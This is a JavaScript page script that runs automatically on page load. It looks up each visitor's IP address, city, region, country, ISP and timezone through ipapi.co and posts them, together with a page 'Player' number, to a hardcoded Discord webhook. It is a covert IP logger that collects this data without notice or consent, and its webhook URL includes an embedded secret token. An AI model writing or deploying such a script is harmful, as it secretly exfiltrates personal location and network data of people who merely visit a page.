document.addEventListener('DOMContentLoaded', async () => {
    const number = document.getElementById('number').textContent.trim();
    console.log('Page number:', number);
    sendWebhook(number);
});

async function sendWebhook(number) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok' });
    console.log('Timestamp:', timestamp);

    try {
        const ipInfo = await getIPInfo();
        console.log('IP Info:', ipInfo);
        await sendToDiscord(ipInfo, number, timestamp);
    } catch (error) {
        console.error('Error in sendWebhook:', error);
    }
}

async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        console.log('IP data:', data);
        return {
            countryCode: data.country_code,
            city: data.city,
            region: data.region,
            country: data.country_name,
            continent: data.continent_code,
            timezone: data.timezone,
            isp: data.org,
            ip: data.ip
        };
    } catch (error) {
        console.error('Error in getIPInfo:', error);
        throw error;
    }
}

async function sendToDiscord(ipInfo, number, timestamp) {
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1269658317190467738/BVvrQdgYhgORmP7Ot5trG3dfHFHGcPDyhHMO-n6zeICKse98YOTTdEzR9D6wZ2HPCuMq';

    const message = {
        content: `Player: [${number}] | ${timestamp} | Country Code: ${ipInfo.countryCode}`,
        embeds: [{
            title: "🌐 New Visit Logged",
            color: 3447003,
            fields: [
                { name: "🔢 Number", value: number, inline: true },
                { name: "🗺️ Location", value: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`, inline: true },
                { name: "🌍 Continent", value: ipInfo.continent, inline: true },
                { name: "🕒 Timezone", value: ipInfo.timezone, inline: true },
                { name: "🏢 ISP", value: ipInfo.isp, inline: true },
                { name: "🔍 IP Address", value: ipInfo.ip, inline: false },
            ],
            footer: {
                text: `Logged at ${timestamp}`
            }
        }]
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        console.log('Webhook sent successfully');
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}
